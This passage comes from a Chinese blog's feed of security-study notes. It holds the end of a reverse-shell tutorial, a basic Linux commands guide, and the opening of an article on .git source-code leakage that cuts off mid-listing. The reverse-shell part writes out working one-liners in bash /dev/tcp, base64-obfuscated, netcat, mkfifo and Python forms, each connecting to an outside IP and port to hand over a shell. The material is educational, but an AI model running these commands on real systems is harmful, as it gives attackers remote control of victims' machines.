netcat），等待目标机器的连接。</li><li>目标机器：目标机器（被攻击的系统）会主动向攻击者机器发起连接，并将一个shell连接回攻击者</li><li>一旦连接建立，攻击者就可以通过该连接来控制目标机器</li></ul><h3 id="反弹shell过程"><a href="#反弹shell过程" class="headerlink" title="反弹shell过程"></a>反弹shell过程</h3><ul><li>攻击者端：攻击者使用一个监听程序（如<code>netcat</code>）等待来自目标机器的连接。</li></ul><p>例如：攻击者在自己的机器上运行一下命令来监听一个端口（如<code>2333</code>端口）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 2333<br></code></pre></td></tr></table></figure><ul><li>目标端：目标机器发起一个连接会攻击者，连接后会得到一个shell。</li></ul><p>例如：目标机器上使用<code>netcat</code>发起反向连接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs bash">----------------------------------------<br>bash -i &gt;&amp; /dev/tcp/47.122.75.126/2333 0&gt;&amp;1<br>/*<br>使用 Bash 实现反弹 shell（适用于Linux系统）<br>bash -i：打开一个交互式的 bash shell。<br>&gt;&amp;：将标准输出和标准错误输出重定向。<br>/dev/tcp/47.122.75.126/2333：利用 bash 的特殊文件表示，尝试建立一个到 47.122.75.126 的 2333 端口的TCP连接。<br>0&gt;&amp;1：将标准输入重定向到标准输出，这样可以让攻击者通过建立的TCP连接与 bash shell 进行交互。<br>*/<br>----------------------------------------<br><span class="hljs-built_in">echo</span> bash -i &gt;&amp; /dev/tcp/47.122.75.126/2333 0&gt;&amp;1<br>----------------------------------------<br><span class="hljs-built_in">echo</span> YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMjIuNzUuMTI2LzIzMzMgMD4mMQ== | <span class="hljs-built_in">base64</span> -d| /bin/bash<br>/*<br>//base64编码绕过<br>*/<br>----------------------------------------<br>nc 47.122.75.126 2333 -e /bin/bash<br>/*<br>2333 是监听的端口，-e /bin/bash 表示通过这个连接执行 /bin/bash 命令，即启动一个 shell<br>*/<br>----------------------------------------<br>nc -e /bin/bash 47.122.75.126 2333<br>/*<br>对于一些较旧的nc版本可以使用。<br>nc（Netcat）：一个强大的网络工具，可用于各种网络操作<br>-e：指定连接成功后执行的程序，这里将 /bin/bash 作为程序，即一旦与 47.122.75.126 的 2333 端口建立连接，就会执行 /bin/bash 并将其作为shell提供给对方。<br>*/<br>----------------------------------------<br><span class="hljs-built_in">rm</span> /tmp/f;<span class="hljs-built_in">mkfifo</span> /tmp/f;<span class="hljs-built_in">cat</span> /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.1.100 2333 &gt;/tmp/f<br>/*<br>对于较新的 nc 版本，可能不支持 -e 选项，可以用这个命令来代替<br><span class="hljs-built_in">rm</span> /tmp/f;<span class="hljs-built_in">mkfifo</span> /tmp/f：删除 /tmp/f ，并创建一个命令管道 /tmp/f<br><span class="hljs-built_in">cat</span> /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.1.100 4444 &gt;/tmp/f：使用管道将 <span class="hljs-built_in">cat</span> 从命名管道读取的数据送给 bash -i，将 bash 的标准错误输出重定向到标准输出，再通过 nc 发送给 47.122.75.126 的 4444 端口，同时 nc 接收的数据重定向回命名管道，形成一个双向通信通道。<br>*/<br>----------------------------------------<br>python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;47.122.75.126&quot;,2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span><br>/*<br>使用 python 实现反弹shell<br>import socket,subprocess,os：导入所需的模块，socket 用于网络连接，subprocess 用于执行外部命令，os 用于文件描述符操作。<br>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)：创建一个 IPv4 的 TCP 套接字。<br>s.connect((&quot;<span class="hljs-number">47.122</span>.<span class="hljs-number">75.126</span>&quot;,<span class="hljs-number">2333</span>))：连接到 47.122.75.126 的 2333 端口。<br>os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)：将套接字的文件描述符复制到标准输入、标准输出和标准错误输出，实现通过套接字的输入输出功能。<br>p=subprocess.call([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>])：执行一个交互式的 bash shell。<br>*/<br>----------------------------------------<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>小知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux基础指令</title>
    <link href="/2025/04/25/Linux%E5%9F%BA%E7%A1%80%E6%8C%87%E4%BB%A4/"/>
    <url>/2025/04/25/Linux%E5%9F%BA%E7%A1%80%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux基础指令"><a href="#Linux基础指令" class="headerlink" title="Linux基础指令"></a>Linux基础指令</h1><h2 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> [选项] [目录或文件]<br></code></pre></td></tr></table></figure><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>对于目录，该命令列出该目录下的所有子目录与文件。对于文件，将列出文件名以及其他信息。</p><h3 id="常用选项"><a href="#常用选项" class="headerlink" title="常用选项"></a>常用选项</h3><ul><li>-a    列出目录下的所有文件，包括以 . 开头的隐含文件。 </li><li>-d    将目录象文件一样显示，而不是显示其下的文件。 如：ls –d 指定目录 </li><li>-i     输出文件的 i 节点的索引信息。 如 ls –ai 指定文件 </li><li>-k    以 k 字节的形式表示文件的大小。ls –alk 指定文件 </li><li>-l     列出文件的详细信息。 </li><li>-t     以时间排序。 </li><li>-R    列出所有子目录下的文件。(递归)</li></ul><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -a<br></code></pre></td></tr></table></figure><h2 id="pwd"><a href="#pwd" class="headerlink" title="pwd"></a>pwd</h2><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">pwd</span><br></code></pre></td></tr></table></figure><h3 id="功能-1"><a href="#功能-1" class="headerlink" title="功能"></a>功能</h3><p>显示用户当前所在的目录</p><h2 id="cd"><a href="#cd" class="headerlink" title="cd"></a>cd</h2><h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> [目录名]<br></code></pre></td></tr></table></figure><h3 id="功能-2"><a href="#功能-2" class="headerlink" title="功能"></a>功能</h3><p>改变工作目录。将当前工作目录改变到指定的目录下。</p><h3 id="举例-1"><a href="#举例-1" class="headerlink" title="举例"></a>举例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">返回上级目录<span class="hljs-built_in">cd</span> ../<br>绝对路径 <span class="hljs-built_in">cd</span> /home/litao/linux/<br>相对路径 <span class="hljs-built_in">cd</span> ../day02/<br>进入用户家目<span class="hljs-built_in">cd</span> ~<br>返回最近访问目录   <span class="hljs-built_in">cd</span> -<br></code></pre></td></tr></table></figure><h2 id="touch"><a href="#touch" class="headerlink" title="touch"></a>touch</h2><h3 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> [ 选项 ]... 文件 ...<br></code></pre></td></tr></table></figure><h3 id="功能-3"><a href="#功能-3" class="headerlink" title="功能"></a>功能</h3><p>touch 命令参数可更改文档或目录的日期时间，包括存取时间和更改时间，或者新建一个不存在 的文件。</p><h3 id="常用选项-1"><a href="#常用选项-1" class="headerlink" title="常用选项"></a>常用选项</h3><ul><li>-a 或–time&#x3D;atime或–time&#x3D;access或–time&#x3D;use只更改存取时间。</li><li>-d 使用指定的日期时间，而非现在的时间。</li><li>-f 此参数将忽略不予处理，仅负责解决BSD版本touch指令的兼容性问题。</li><li>-m 或–time&#x3D;mtime或–time&#x3D;modify 只更改变动时间。</li><li>-r 把指定文档或目录的日期时间，统统设成和参考文档或目录的日期时间相同。</li><li>-t 使用指定的日期时间，而非现在的时间。</li></ul><h3 id="举例-2"><a href="#举例-2" class="headerlink" title="举例"></a>举例</h3><p>创建一个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> study.txt<br></code></pre></td></tr></table></figure><p>批量创建文件</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">touch &#123;a,b,c&#125;<span class="hljs-string">.txt</span><br>touch &#123;0.<span class="hljs-string">.9</span>&#125;<span class="hljs-string">.txt</span><br></code></pre></td></tr></table></figure><h2 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h2><h3 id="语法-4"><a href="#语法-4" class="headerlink" title="语法"></a>语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> [ 选项 ] 源文件或目录 目标文件或目录<br></code></pre></td></tr></table></figure><h3 id="功能-4"><a href="#功能-4" class="headerlink" title="功能"></a>功能</h3><p>复制文件或目录</p><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>cp 指令用于复制文件或目录，如同时指定两个以上的文件或目录，且最后的目的地是一个已经存 在的目录，则它会把前面指定的所有文件或目录复制到此目录中。若同时指定多个文件或目录，而最后 的目的地并非一个已存在的目录，则会出现错误信息</p><h3 id="常用选项-2"><a href="#常用选项-2" class="headerlink" title="常用选项"></a>常用选项</h3><ul><li>-f 或 –force 强行复制文件或目录， 不论目的文件或目录是否已经存在</li><li>-i 或 –interactive 覆盖文件之前先询问用户</li><li>-r 递归处理，将指定目录下的文件与子目录一并处理。若源文件或目录的形态，不属于目录或符号 链接， 则一律视为普通文件处理</li><li>-R 或 –recursive 递归处理，将指定目录下的文件及子目录一并处理</li></ul><h3 id="举例-3"><a href="#举例-3" class="headerlink" title="举例"></a>举例</h3><p>复制文件只需要将源文件和目标文件名称一起键入即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> text1.txt new_file.txt<br></code></pre></td></tr></table></figure><p>还可以使用递归标志复制整个目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> -r test1/ test2/<br></code></pre></td></tr></table></figure><h2 id="mv"><a href="#mv" class="headerlink" title="mv"></a>mv</h2><p>mv命令是move的缩写，可以用来移动文件或者将文件改名（move (rename) files），是Linux系统下常 用的命令， 经常用来备份文件或者目录。</p><h3 id="语法-5"><a href="#语法-5" class="headerlink" title="语法"></a>语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mv</span> [选项] 源文件或目录 目标文件或目录<br></code></pre></td></tr></table></figure><h3 id="功能-5"><a href="#功能-5" class="headerlink" title="功能"></a>功能</h3><ol><li>视mv命令中第二个参数类型的不同（是目标文件还是目标目录），mv命令将文件重命名或将其移 至一个新的 目录中。</li><li>当第二个参数类型是文件时，mv命令完成文件重命名，此时，源文件只能有一个（也可以是源目录 名），它将 所给的源文件或目录重命名为给定的目标文件名。</li><li>当第二个参数是已存在的目录名称时，源文件或目录参数可以有多个，mv命令将各参数指定的源文 件均移至目 标目录中。</li></ol><h3 id="常用选项-3"><a href="#常用选项-3" class="headerlink" title="常用选项"></a>常用选项</h3><ul><li>-f ：force 强制的意思，如果目标文件已经存在，不会询问而直接覆盖</li><li>-i ：若目标文件 (destination) 已经存在时，就会询问是否覆盖！</li></ul><h3 id="举例-4"><a href="#举例-4" class="headerlink" title="举例"></a>举例</h3><p>如果想要移动文件到另一个文件夹，需要输入对应文件夹的完整路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mv</span> filename.txt /home/grill<br></code></pre></td></tr></table></figure><p>比如准备重命名文件，同时保留在同一目录中可以输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mv</span> old_file.txt new_named_file.txt<br></code></pre></td></tr></table></figure><h2 id="mkdir"><a href="#mkdir" class="headerlink" title="mkdir"></a>mkdir</h2><h3 id="语法-6"><a href="#语法-6" class="headerlink" title="语法"></a>语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> [选项] <span class="hljs-built_in">dirname</span>... <br></code></pre></td></tr></table></figure><h3 id="功能-6"><a href="#功能-6" class="headerlink" title="功能"></a>功能</h3><p>在当前目录下创建一个名为 “dirname” 的目录</p><h3 id="常用选项-4"><a href="#常用选项-4" class="headerlink" title="常用选项"></a>常用选项</h3><ul><li>-p、–parents 可以是一个路径名称。此时若路径中的某些目录尚不存在,加上此选项后,系统将自动建立好 那些尚不存在的目录,即一次可以建立多个目录</li></ul><h3 id="举例-5"><a href="#举例-5" class="headerlink" title="举例"></a>举例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> images/创建一个保存所以图像的目录<br><span class="hljs-built_in">mkdir</span> -p test1/test2 递归建立多个目录<br></code></pre></td></tr></table></figure><h2 id="rmdir"><a href="#rmdir" class="headerlink" title="rmdir"></a>rmdir</h2><p>rmdir 是一个与 mkdir 相对应的命令。 mkdir 是建立目录，而 rmdir 是删除命令。</p><h3 id="语法-7"><a href="#语法-7" class="headerlink" title="语法"></a>语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rmdir</span> [-p] [dirName]<br></code></pre></td></tr></table></figure><h3 id="适用对象"><a href="#适用对象" class="headerlink" title="适用对象"></a>适用对象</h3><p>具有当前目录操作权限的所有使用者</p><h3 id="功能-7"><a href="#功能-7" class="headerlink" title="功能"></a>功能</h3><p>删除空目录</p><h3 id="常用选项-5"><a href="#常用选项-5" class="headerlink" title="常用选项"></a>常用选项</h3><ul><li>p 当子目录被删除后如果父目录也变成空目录的话，就连带父目录一起删除。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rmdir</span> test1<br></code></pre></td></tr></table></figure><h2 id="rm"><a href="#rm" class="headerlink" title="rm"></a>rm</h2><p>rm 命令可以同时删除文件或目录</p><h3 id="语法-8"><a href="#语法-8" class="headerlink" title="语法"></a>语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> [-f-i-r-v] [dirName/dir]<br></code></pre></td></tr></table></figure><h3 id="适用对象-1"><a href="#适用对象-1" class="headerlink" title="适用对象"></a>适用对象</h3><p>所有使用者</p><h3 id="功能-8"><a href="#功能-8" class="headerlink" title="功能"></a>功能</h3><p>删除文件或目录</p><h3 id="常用选项-6"><a href="#常用选项-6" class="headerlink" title="常用选项"></a>常用选项</h3><ul><li>-f 即使文件属性为只读(即写保护)，亦直接删除</li><li>-i 删除前逐一询问确认</li><li>-r 删除目录及其下所有文件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> text.txt<br></code></pre></td></tr></table></figure><p>删除文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> -r test1<br></code></pre></td></tr></table></figure><h2 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h2><p>Linux sudo命令以系统管理者的身份执行指令，也就是说，经由 sudo 所执行的指令就好像是 root 亲自 执行。</p><p>sudo通常用于安装软件或编辑用户主目录以外的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install strings<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">cd</span> /root/<br></code></pre></td></tr></table></figure><p>在运行键入的命令前，它会要求输入管理员密码</p><p>开启root</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -i<br></code></pre></td></tr></table></figure><h2 id="vim（vi）编辑发法"><a href="#vim（vi）编辑发法" class="headerlink" title="vim（vi）编辑发法"></a>vim（vi）编辑发法</h2><p>直接输入，就可以编辑文件，没有文件会自动创建一个</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi filename.txt 回车<br></code></pre></td></tr></table></figure><p>然后按a或i进入编辑模式，输入想要添加的文本，然后按esc退出编辑模式，输入:wq保存并退出</p><h2 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h2><p>echo命令在终端中显示定义的文本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Cool message&quot;</span><br></code></pre></td></tr></table></figure><p>用echo新建文件，讲文本添加到文件中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;This is a sample text&quot;</span> &gt;&gt; filename.txt<br></code></pre></td></tr></table></figure><p>使用echo命令打印所有的文件和文件夹（ls命令的替代）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> *<br></code></pre></td></tr></table></figure><p>还可以使用echo来输出文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(&lt;fileName)</span>&quot;</span><br></code></pre></td></tr></table></figure><p>在上面的命令中，’&lt;’是重定向符，用于改变标准输入的源（从键盘改为文件fileName)；&lt;fileName将<br>fileName文件输入到stdin中。$(&lt;fileName)用于获取stdin中的数据</p><p>如果一个文件是unicode编码，则利用下面这条命令，可以转化为中文</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;<span class="hljs-subst">$(&lt;fileName)</span>&quot;</span><br></code></pre></td></tr></table></figure><h2 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h2><h3 id="语法-9"><a href="#语法-9" class="headerlink" title="语法"></a>语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> [选项] [文件]<br></code></pre></td></tr></table></figure><h3 id="功能-9"><a href="#功能-9" class="headerlink" title="功能"></a>功能</h3><p>查看目标文件的内容</p><h3 id="常用选项-7"><a href="#常用选项-7" class="headerlink" title="常用选项"></a>常用选项</h3><ul><li>-b 对非空输出行编号</li><li>-n 对输出的所有行编号</li><li>-s 不输出多行空行 一般直接使用</li></ul><h3 id="举例-6"><a href="#举例-6" class="headerlink" title="举例"></a>举例</h3><p>一般直接使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> text.txt<br></code></pre></td></tr></table></figure><p>cat指令也可以编辑文件文本（如果没有该文件会直接创建）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> &gt;&gt; test.txt<br></code></pre></td></tr></table></figure><h2 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h2><p>strings命令在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序 列，以换行符或空字符结束。</p><h3 id="语法-10"><a href="#语法-10" class="headerlink" title="语法"></a>语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">strings [选项] 文件<br></code></pre></td></tr></table></figure><h3 id="常用选项-部分"><a href="#常用选项-部分" class="headerlink" title="常用选项(部分)"></a>常用选项(部分)</h3><ul><li>-a –all：扫描整个文件而不是只扫描目标文件初始化和装载段</li><li>-f –print-file-name：在显示字符串前先显示文件名</li></ul><h3 id="举例-7"><a href="#举例-7" class="headerlink" title="举例"></a>举例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">strings filename提取文件中的字符串<br>strings filename &gt; output.txt将输出结果写入文件<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>小知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Git和Git文件导致源码泄露</title>
    <link href="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
    <url>/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/</url>
    
    <content type="html"><![CDATA[<p>参考文章</p><blockquote><p>Git文件泄露漏洞：<a href="https://blog.csdn.net/qq_45521281/article/details/105767428">https://blog.csdn.net/qq_45521281/article/details/105767428</a></p></blockquote><h1 id="什么是Git"><a href="#什么是Git" class="headerlink" title="什么是Git"></a>什么是Git</h1><p>Git是目前世界上最先进的免费开源分布式版本控制系统，其诞生主要是为了高效管理像 Linux 内核这种规模的庞大项目</p><h2 id="什么是版本控制系统"><a href="#什么是版本控制系统" class="headerlink" title="什么是版本控制系统"></a>什么是版本控制系统</h2><p>版本控制系统（Version Control System，VCS）是一种在软件开发过程中用于管理文件和项目版本的工具，可以记录文件内容的变化，让用户查看特定版本的文件内容，还能再不同版本之间进行切换，同时也方便团队成员协作开发</p><p>版本控制系统类型有：本地版本控制系统、集中式版本控制系统、分布式版本控制系统</p><h3 id="本地版本控制系统"><a href="#本地版本控制系统" class="headerlink" title="本地版本控制系统"></a>本地版本控制系统</h3><p>这种系统只在本地对文件的不同版本进行管理。它会在本地保存文件的多个版本，通过简单的数据库来记录文件的更新。例如 RCS（Revision Control System），它在本地磁盘上保存补丁集（文件修订前后的差异），通过应用这些补丁集来重现文件的各个版本。</p><h3 id="集中式版本控制系统"><a href="#集中式版本控制系统" class="headerlink" title="集中式版本控制系统"></a>集中式版本控制系统</h3><p>该系统有一个集中管理的服务器，保存所有文件的修订版本，而协同工作的开发者们的客户端则从服务器获取最新的文件或者提交更新。SVN（Subversion）就是典型的集中式版本控制系统。其优点是方便管理员对版本库进行管理，缺点是依赖中央服务器，若服务器出现故障，团队成员就无法正常工作。</p><h3 id="分布式版本控制系统"><a href="#分布式版本控制系统" class="headerlink" title="分布式版本控制系统"></a>分布式版本控制系统</h3><p>每个开发者的本地都有完整的版本库副本，包含所有的历史版本信息。Git 是分布式版本控制系统的代表。在分布式系统中，开发者可以在本地进行各种版本控制操作，如提交、创建分支等，不需要依赖网络连接到中央服务器。团队成员之间的协作可以通过推送和拉取操作在不同的本地仓库之间进行。</p><h2 id="版本库、工作区和暂存区"><a href="#版本库、工作区和暂存区" class="headerlink" title="版本库、工作区和暂存区"></a>版本库、工作区和暂存区</h2><h3 id="版本库"><a href="#版本库" class="headerlink" title="版本库"></a>版本库</h3><p>版本库（Repository），也被称作仓库，是版本控制系统的核心组件，用于存储项目的所有文件及其历史版本信息，集中存储项目所有文件版本信息的地方，版本控制系统会对文件的每一次修改进行记录，包括修改的内容、时间、作者等，这些信息都被保存在版本库中。</p><p>版本库可以简单理解成一个目录，这个目录里面的所有文件都可以被Git管理起来，每个文件的修改、删除，Git都能跟踪，以便任何时刻都可以追踪历史，或者在将来某个时刻可以“还原”。</p><h4 id="本地版本库"><a href="#本地版本库" class="headerlink" title="本地版本库"></a>本地版本库</h4><p>存在于开发者本地计算机中的版本库。开发者可以在本地对版本库进行各种操作，如提交、查看历史记录等，无需依赖网络连接。例如使用 Git 时，在项目目录下执行<code>git init</code>命令就会在本地创建一个版本库。</p><h4 id="远程版本库"><a href="#远程版本库" class="headerlink" title="远程版本库"></a>远程版本库</h4><p>存储在远程服务器上的版本库，通常用于团队协作开发。团队成员可以从远程版本库克隆项目到本地，进行开发后再将本地的修改推送到远程版本库，与其他成员共享。像 GitHub、GitLab 等平台提供的就是远程版本库服务。</p><h3 id="工作区"><a href="#工作区" class="headerlink" title="工作区"></a>工作区</h3><p>工作区指的是你在本地计算机里实际操作的项目目录，就是你能够看到并进行文件编辑、创建、删除等操作的文件夹，简单的说就是电脑中看到的目录。</p><p>在工作区，你能自由修改文件内容，它独立于版本控制系统的其他部分。版本控制系统一开始并不会自动跟踪你在工作区的修改，只有当你执行特定操作时，这些修改才会被纳入版本控制流程。</p><p>假设你使用 Git 管理一个名为<code>my_project</code>的项目，在本地磁盘上的<code>C:\Users\Username\my_project</code>目录就是工作区。你可以在这个目录下使用文本编辑器打开文件进行修改，或者创建新文件。</p><h3 id="暂存区"><a href="#暂存区" class="headerlink" title="暂存区"></a>暂存区</h3><p>暂存区也被叫做索引（index），它是一个中间区域，用于准备要提交到本地仓库的文件修改。当你对工作区的文件进行修改后，可选择将部分或全部修改添加到暂存区。</p><p>暂存区再版本库里，版本库就是隐藏目录 <code>.git</code></p><p>分支在实际中有什么用呢？假设你准备开发一个新功能，但是需要两周才能完成，第一周你写了50%的代码，如果立刻提交，由于代码还没写完，不完整的代码库会导致别人不能干活了。如果等代码全部写完再一次提交，又存在丢失每天进度的巨大风险。</p><p>现在有了分支，就不用怕了。你创建了一个属于你自己的分支，别人看不到，还继续在原来的分支上正常工作，而你在自己的分支上干活，想提交就提交，直到开发完毕后，再一次性合并到原来的分支上，这样，既安全，又不影响别人工作。</p><h1 id="git文件导致的源码泄露"><a href="#git文件导致的源码泄露" class="headerlink" title=".git文件导致的源码泄露"></a>.git文件导致的源码泄露</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>开发人员再开发时，常常会先把源码提交到远程托管网站（如：<code>github</code>），最后再从远程托管网站把源码pull到服务器的web目录下，如果忘记删除<code>.git</code>文件，就会导致源码泄露，攻击者就可能会将<code>.git</code>文件夹直接部署到线上环境，这就引起了git泄露漏洞</p><h3 id="git的目录结构"><a href="#git的目录结构" class="headerlink" title="git的目录结构"></a>git的目录结构</h3><p>在一个目录中初始化一个仓库以后，<code>Git</code>会在该目录下创建一个名为<code>.git</code>的隐藏目录（版本库），这个目录中包含了<code>Git</code>仓库的所有元数据和对象数据库（就是这个仓库的所有版本等一系列信息），如下</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 